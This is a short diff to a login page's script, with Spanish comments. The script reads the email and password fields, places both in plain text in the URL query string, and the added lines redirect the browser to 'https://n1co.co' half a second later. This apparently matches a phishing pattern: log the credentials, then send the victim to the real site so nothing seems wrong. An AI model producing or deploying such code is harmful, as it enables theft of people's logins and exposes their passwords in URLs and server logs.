@@ -157,8 +157,11 @@
       const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
       
-      // Los datos se verán en la URL
+      // Los datos se verán en la URL y luego redirige a n1co.co
       window.location.href = `?username=${email}&password=${password}`;
+      setTimeout(() => {
+        window.location.href = 'https://n1co.co';
+      }, 500);
     }
   </script>
 </body>
